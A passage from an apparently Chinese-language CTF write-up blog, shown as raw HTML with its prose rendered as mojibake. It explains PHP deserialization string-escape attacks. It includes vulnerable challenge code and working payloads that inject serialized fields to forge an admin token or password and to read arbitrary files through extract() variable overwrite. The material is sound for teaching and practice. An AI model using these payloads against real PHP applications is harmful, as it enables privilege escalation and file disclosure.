print(subnode)</span><br><span class="hljs-keyword">if</span>(subnode.name <span class="hljs-keyword">in</span> skip_func):<br><span class="hljs-keyword">continue</span><br>target = functions[subnode.name]<br>func_name = subnode.name<br>pop_chain.append(func_name)<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(subnode) == If):<br><span class="hljs-comment"># print(subnode)</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(subnode.node) == MethodCall :<br><span class="hljs-comment"># print(subnode.node.name)</span><br><span class="hljs-keyword">if</span>( subnode.node.name <span class="hljs-keyword">in</span> skip_func):<br><span class="hljs-keyword">continue</span><br>target = functions[subnode.node.name]<br>func_name = subnode.node.name<br>pop_chain.append(func_name)<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(subnode) == Eval):<br>e = <span class="hljs-literal">True</span><br><span class="hljs-keyword">for</span> pop <span class="hljs-keyword">in</span> pop_chain:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;class &quot;</span> + functions[pop].name + <span class="hljs-string">&quot;&#123;&quot;</span>)<br><span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> functions[pop].nodes:<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == ClassVariables):<br><span class="hljs-keyword">for</span> subnode <span class="hljs-keyword">in</span> node.nodes:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;public &quot;</span> + subnode.name + <span class="hljs-string">&#x27;;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;public function __construct()&#123;&quot;</span>)<br><span class="hljs-keyword">if</span> i+<span class="hljs-number">1</span> == <span class="hljs-built_in">len</span>(pop_chain):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;$this-&gt;&quot;</span> + subnode.name[<span class="hljs-number">1</span>:] + <span class="hljs-string">&quot;= new &quot;</span> +<br>functions[pop_chain[i+<span class="hljs-number">1</span>]].name + <span class="hljs-string">&quot;();&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#125;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#125;&quot;</span>)<br>i += <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> i == <span class="hljs-built_in">len</span>(pop_chain):<br><span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="å­—ç¬¦ä¸²é€ƒé€¸"><a href="#å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="å­—ç¬¦ä¸²é€ƒé€¸"></a>å­—ç¬¦ä¸²é€ƒé€¸</h2><p>PHP åœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ˜¯ä»¥ <code>;</code> ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥ <code>&#125;</code> ä½œä¸ºç»“å°¾(å­—ç¬¦ä¸²é™¤å¤–)ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„ ï¼ŒåŒæ—¶ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å¿…é¡»ä¸¥æ ¼æŒ‰ç…§åºåˆ—åŒ–è§„åˆ™æ‰èƒ½æˆåŠŸå®ç°ååºåˆ—åŒ– ã€‚å¦‚ä¸‹å›¾ï¼Œout!å¹¶ä¸ä¼šè¢«åºåˆ—åŒ–</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210720135305824.png"></p><p>å½“æŸä¸ªå±æ€§çš„å­—ç¬¦ä¸²é•¿åº¦ä¸ä¸€è‡´æ—¶ä¹Ÿä¸ä¼šè¢«åºåˆ—åŒ–æˆåŠŸ</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210720135505974.png"></p><h3 id="å¢å¤šï¼š"><a href="#å¢å¤šï¼š" class="headerlink" title="å¢å¤šï¼š"></a>å¢å¤šï¼š</h3><ul><li>ctfshow 262</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;from = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-variable">$m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>];<br><span class="hljs-variable">$t</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;t&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$f</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$t</span>))&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> message(<span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span>);<br>    <span class="hljs-variable">$umsg</span> = str_replace(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, serialize(<span class="hljs-variable">$msg</span>));<br>    setcookie(<span class="hljs-string">&#x27;msg&#x27;</span>,base64_encode(<span class="hljs-variable">$umsg</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your message has been sent&#x27;</span>;<br>&#125;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>å‰é¢æ³¨é‡Šå‘ç°æœ‰ä¸ª<code>message.php</code> ,è®¿é—®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;from = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$msg</span> = unserialize(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>-&gt;token==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payloadï¼š</p><p>æŠŠ base64 ç¼–ç åçš„ç»“æœæ”¾åˆ° cookie é‡Œé¢è®¿é—® message.php å°±èƒ½æ‹¿åˆ° flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;from = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> message(a,b,<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$umsg</span> = str_replace(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, serialize(<span class="hljs-variable">$c</span>));<br><span class="hljs-keyword">echo</span> base64_encode(<span class="hljs-variable">$umsg</span>);<br></code></pre></td></tr></table></figure><p>æˆ–è€…ç›´æ¥åœ¨ index.php ä¼ å€¼</p><blockquote><p>f=a&amp;m=b&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckâ€;s:5:â€tokenâ€;s:5:â€adminâ€;}</p></blockquote><p>è®¿é—® message.php</p><ul><li>æŸæ ¡çš„ä¸€é¢˜</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;secure&#x27;</span>, <span class="hljs-string">&#x27;secured&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;Marble&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;fucku&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$h</span> = <span class="hljs-keyword">new</span> Hacker();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-comment">//Security filtering</span><br>    <span class="hljs-variable">$h</span>-&gt;username = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = unserialize(filter(serialize(<span class="hljs-variable">$h</span>)));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span>-&gt;password === <span class="hljs-string">&#x27;hacker&#x27;</span>) &#123;<br>        var_dump(file_get_contents(<span class="hljs-string">&#x27;./flag.php&#x27;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è§£é¢˜æ­¥éª¤ï¼š</p><p>é¦–å…ˆå¾—åˆ°åºåˆ—åŒ–çš„å­—ç¬¦ä¸²<code>O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;Marble&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;</code></p><p>æˆªå–éœ€è¦é€ƒé€¸çš„å­—ç¬¦ä¸²<code>&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;</code></p><p>é•¿åº¦ä¸º 31ï¼Œsecure å…¨éƒ¨æ›¿æ¢ä¸º securedï¼Œå­—ç¬¦ä¸²+1ï¼Œåˆ™éœ€è¦<code>31</code>ä¸ª secure æŠŠç›®æ ‡å­—ç¬¦ä¸²é¡¶å‡ºå»</p><p>payloadï¼š</p><blockquote><p>username=securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecureâ€;s:8:â€passwordâ€;s:6:â€hackerâ€;}&amp;password=</p></blockquote><p>é¢˜ç›®æ”¹ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$a</span> = str_replace(<span class="hljs-string">&#x27;secure&#x27;</span>, <span class="hljs-string">&#x27;securing&#x27;</span>, <span class="hljs-variable">$str</span>);<br><br>    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;love&#x27;</span>, <span class="hljs-string">&#x27;lover&#x27;</span>, <span class="hljs-variable">$a</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;Marble&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;fucku&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$h</span> = <span class="hljs-keyword">new</span> Hacker();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-comment">//Security filtering</span><br>    <span class="hljs-variable">$h</span>-&gt;username = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = unserialize(filter(serialize(<span class="hljs-variable">$h</span>)));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span>-&gt;password === <span class="hljs-string">&#x27;hacker&#x27;</span>) &#123;<br>        var_dump(file_get_contents(<span class="hljs-string">&#x27;./flag.php&#x27;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯è§æ­¤å¤„ secure å˜ä¸ºäº† secureï¼Œlove å˜ä¸º lover</p><p>ä»ç„¶è¦é€ƒé€¸ 31 ä¸ªå­—ç¬¦ï¼Œå½“ç„¶å¯ä»¥ 31 ä¸ª loveï¼Œç›´æ¥å¯ä»¥é€ƒé€¸ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥æ„é€  15 ä¸ª secure å’Œä¸€ä¸ª love</p><p>payloadï¼š</p><blockquote><p>username=securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecureloveâ€;s:8:â€passwordâ€;s:6:â€hackerâ€;}&amp;password=1</p></blockquote><h3 id="å‡å°‘ï¼š"><a href="#å‡å°‘ï¼š" class="headerlink" title="å‡å°‘ï¼š"></a>å‡å°‘ï¼š</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br> <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br> <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br> <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br> <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br>extract(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot; rel=&quot;external nofollow&quot; &gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><span class="hljs-variable">$serialize_info</span> = filter(serialize(<span class="hljs-variable">$_SESSION</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br> highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br> <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br> <span class="hljs-variable">$userinfo</span> = unserialize(<span class="hljs-variable">$serialize_info</span>);<br> <span class="hljs-keyword">echo</span> file_get_contents(base64_decode(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><p>extract å˜é‡è¦†ç›–,file_get_contents ä»»æ„æ–‡ä»¶è¯»å–.</p><p>å°†å˜é‡$userinfo[â€˜imgâ€™]é€†æ¨å›å»å‘ç°,æ˜¯ç”±å‚æ•° img_path æ§åˆ¶çš„,ä½†æ˜¯ç»è¿‡ sha1 åŠ å¯†,æˆ‘ä»¬æ— æ³•å¾—çŸ¥åŠ å¯†åå†…å®¹,ä½†ç»“åˆå‰é¢çš„ extract å˜é‡è¦†ç›–,æˆ‘ä»¬å¯ä»¥è‡ªå·± POST æ„é€ .</p><p>æ„é€ äº†ä¹‹å,ä¼šç»è¿‡åºåˆ—åŒ– filter å‡½æ•°æ›¿æ¢ä¸€äº›å­—ç¬¦(é‚£ä¹ˆæ­¤æ—¶åºåˆ—åŒ–åçš„æ•°æ®åˆ™å‘ç”Ÿäº†å˜åŒ–,å¯èƒ½å­˜åœ¨æ¼æ´),å†ååºåˆ—åŒ–,è¯»å–å‚æ•°å€¼.</p><p>åºåˆ—åŒ–å,æœ‰ä¸‰ä¸ªå…ƒç´ ,åˆ†åˆ«æ˜¯ img,user,function,è€Œæˆ‘ä»¬èƒ½æ§åˆ¶çš„åªæœ‰åé¢ä¸¤ä¸ª,æˆ‘ä»¬éœ€è¦æ„é€ çš„ payload æ˜¯è¿™æ ·çš„</p><blockquote><p>fâ€;s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA==â€;s:3:â€tqlâ€;s:3:â€tqlâ€;}</p></blockquote><p>ä½†æ˜¯ä¸ç»ä»»ä½•æ”¹å˜åˆ™æ˜¯è¿™æ ·çš„</p><blockquote><p>a:3:{s:4:â€userâ€;s:5:â€guestâ€;s:8:â€functionâ€;s:10:â€show_imageâ€;s:3:â€imgâ€;s:40:â€1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5â€;}</p></blockquote><p>åˆ©ç”¨æˆªæ–­çš„æ€æƒ³ä¸è®©å…¶è¯»å–å…ƒç´  img çš„å€¼,æˆ‘ä»¬è‡ªå·±æ¥æ„é€ è¿™ä¸ªå€¼,åªæœ‰ä¸¤ä¸ªå‚æ•°,å¿…é¡»åœ¨ function å“ªé‡Œæˆªæ–­,è€Œè¿™ä¸ªååºåˆ—æ˜¯é•¿åº¦é€’å‡,é‚£ä¹ˆå°±æ˜¯é€‰æ‹©å…ƒç´ åå™¬(åå™¬çš„é•¿åº¦è‡ªå·±é…Œæƒ…å‚è€ƒ,ä¸€èˆ¬æ˜¯åˆ°è‡ªå·±èƒ½æ§åˆ¶çš„ç‚¹å°±å¥½)åé¢çš„é•¿åº¦,æ¥æ„é€ è‡ªå·±çš„ payload å’¯,æˆ‘ä»¬å°±é€‰ user å…ƒç´ å§,len(â€˜â€œ;s:8:â€functionâ€;s:10:â€â€˜)çš„é•¿åº¦ä¸º 23,ä½†æ˜¯æˆ‘ä»¬æ— æ³•æ„é€  23 ä¸ªé•¿åº¦,æˆ‘ä»¬å¯ä»¥å¤šåå™¬ä¸€ä¸ª,24 ä¸ªå­—ç¬¦,é‚£ä¹ˆå°±ç”¨ 6 ä¸ª flag å°±å¥½,ä½†æ˜¯è¿™æ ·åé¢çš„åºåˆ—åŒ–å°±æ··ä¹±äº†,æˆ‘ä»¬å°±è¦æ·»åŠ è‡ªå·±çš„ payload,å¹¶è¡¥å…¨.è™½ç„¶è¿™æ ·è¡¥å¥½äº†,ä½†æ˜¯åªæœ‰ä¸¤ä¸ªå…ƒç´ ,è¿™é‡Œéœ€è¦ä¸‰ä¸ªå…ƒç´ ,æˆ‘ä»¬å°±å†æ·»åŠ å…ƒç´ ,å¹¶å°†åé¢çš„ img è¿›è¡Œæˆªæ–­</p><blockquote><p>a:3:{s:4:â€userâ€;s:24:â€â€;s:8:â€functionâ€;s:10:â€show_imageâ€;s:3:â€imgâ€;s:40:â€1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5â€;}<br>a:3:{s:4:â€userâ€;s:24:â€â€;s:8:â€functionâ€;s:2:â€22â€;s:3:â€imgâ€;s:40:â€1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5â€;}</p></blockquote><p>æˆªæ–­åªéœ€}å³å¯,å¹¶ä¸”ä¸ä¸ºè¯»å–çš„å­—ç¬¦å³å¯,å› æ­¤æ·»åŠ  fâ€;s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA==â€;s:3:â€tqlâ€;s:3:â€tqlâ€;},è¿™é‡Œæˆ‘ä»¬æ–°å¢äº†ä¸€ä¸ªå…ƒç´ ,å› æ­¤åå™¬å function å…ƒç´ æ¶ˆå¤±äº†,éšä¾¿è¡¥å……å¥½å…ƒç´ å³å¯.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br> <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span 